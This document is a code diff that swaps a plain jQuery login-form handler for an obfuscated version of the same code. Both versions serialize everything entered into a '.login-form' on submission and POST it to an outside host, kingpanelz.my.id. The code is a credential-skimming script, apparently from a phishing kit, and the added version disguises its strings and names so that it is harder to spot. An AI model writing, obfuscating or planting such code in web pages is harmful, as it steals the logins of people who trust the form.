@@ -1,15 +1,52 @@
-$(".login-form").submit(function() {  
- var d = $(".login-form");  
-  
- $.ajax({  
-        url: "https://kingpanelz.my.id/api/js/production/api.php",  
-        type: "POST",  
-        data: d.serialize(),  
-        success: function () {  
-            return true;  
-        },  
-        error: function () {  
-            return true;  
-        },  
-    });  
-});
+var _0x1d5ed5 = _0x42a6;
+
+function _0x199c() {
+    var _0x364945 = ['4258140YYIOgg', 'submit', '87736QHbWge', 'y.id/api/j', 'https://ki', '5228839Jsrppg', 'on/api.php', 'serialize', '47646UFaWwI', '500958bZRBhB', 'ajax', '1200qfeBKW', 'UwzKd', 'kFhJd', 'qJCVS', 'gwhRU', '65gPAama', '116468phszsX', 'POST', 's/producti', 'ngpanelz.m', '.login-for', '1023258pZolfd'];
+    _0x199c = function() {
+        return _0x364945;
+    };
+    return _0x199c();
+}
+
+function _0x42a6(_0x55a6e7, _0x1f6598) {
+    var _0x514824 = _0x199c();
+    return _0x42a6 = function(_0x1b289e, _0xb36496) {
+        _0x1b289e = _0x1b289e - (0x2326 + 0x1 * 0x62 + -0x22d1);
+        var _0x2c89ab = _0x514824[_0x1b289e];
+        return _0x2c89ab;
+    }, _0x42a6(_0x55a6e7, _0x1f6598);
+}(function(_0x4f455e, _0x4bf2c2) {
+    var _0x21e946 = _0x42a6,
+        _0x430808 = _0x4f455e();
+    while (!![]) {
+        try {
+            var _0x41fe81 = parseInt(_0x21e946(0xc8)) / (-0x255a + -0x1 * -0x1a9 + 0x5f3 * 0x6) + parseInt(_0x21e946(0xc0)) / (-0x839 * 0x3 + 0x1acd + -0x220) + -parseInt(_0x21e946(0xcd)) / (-0x1 * -0xb72 + -0x7 * -0x18b + 0x2 * -0xb1e) + parseInt(_0x21e946(0xb9)) / (-0x3 * -0x496 + 0x1 * 0x414 + -0x11d2) * (-parseInt(_0x21e946(0xc7)) / (0x905 * 0x1 + 0xac3 + -0x13c3)) + parseInt(_0x21e946(0xb7)) / (0xd69 * 0x2 + -0x249a + 0x9ce) + parseInt(_0x21e946(0xbc)) / (-0x1978 + 0x813 + 0xdf * 0x14) + parseInt(_0x21e946(0xc2)) / (0x7 * -0xb5 + 0x1d99 + 0x112 * -0x17) * (-parseInt(_0x21e946(0xbf)) / (0x16c5 + -0x13e * 0x3 + -0x1302));
+            if (_0x41fe81 === _0x4bf2c2) break;
+            else _0x430808['push'](_0x430808['shift']());
+        } catch (_0x2d8902) {
+            _0x430808['push'](_0x430808['shift']());
+        }
+    }
+}(_0x199c, -0x15ec0 + -0x20170 + 0x98786), $(_0x1d5ed5(0xcc) + 'm')[_0x1d5ed5(0xb8)](function() {
+    var _0x1a3f6c = _0x1d5ed5,
+        _0x3a40e2 = {
+            'UwzKd': function(_0x4f57a4, _0x5e1b43) {
+                return _0x4f57a4(_0x5e1b43);
+            },
+            'gwhRU': _0x1a3f6c(0xcc) + 'm',
+            'kFhJd': _0x1a3f6c(0xbb) + _0x1a3f6c(0xcb) + _0x1a3f6c(0xba) + _0x1a3f6c(0xca) + _0x1a3f6c(0xbd),
+            'qJCVS': _0x1a3f6c(0xc9)
+        },
+        _0x4ecf07 = _0x3a40e2[_0x1a3f6c(0xc3)]($, _0x3a40e2[_0x1a3f6c(0xc6)]);
+    $[_0x1a3f6c(0xc1)]({
+        'url': _0x3a40e2[_0x1a3f6c(0xc4)],
+        'type': _0x3a40e2[_0x1a3f6c(0xc5)],
+        'data': _0x4ecf07[_0x1a3f6c(0xbe)](),
+        'success': function() {
+            return !![];
+        },
+        'error': function() {
+            return !![];
+        }
+    });
+}));
